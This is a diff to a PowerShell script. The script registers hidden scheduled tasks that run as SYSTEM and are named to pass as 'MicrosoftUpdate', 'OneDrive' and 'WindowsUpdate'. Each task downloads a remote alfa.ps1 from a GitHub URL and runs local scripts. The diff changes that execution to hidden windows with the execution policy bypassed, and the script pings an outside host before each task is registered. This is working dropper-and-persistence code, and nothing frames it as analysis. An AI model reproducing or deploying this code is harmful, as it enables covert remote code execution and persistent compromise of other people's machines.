@@ -23,7 +23,7 @@ function Gen-Info {
     
     # SCHEDULE TASK CREATION
     
-    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path') } else { if (Test-Path '$alfa_path') { & $alfa_path } else { if (Test-Path '$bravo_path') { & $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
+    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path') } else { if (Test-Path '$alfa_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $alfa_path } else { if (Test-Path '$bravo_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
     
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
@@ -31,21 +31,25 @@ function Gen-Info {
     
     $task_alfa = "MicrosoftUpdate"
     if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
+        # CONNECTION
         Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
     
     $task_bravo = "OneDrive"
     if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
+        # CONNECTION
         Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
     
     $task_charlie = "WindowsUpdate"
     if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
+        # CONNECTION
         Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
 }
 
 Gen-Info
+
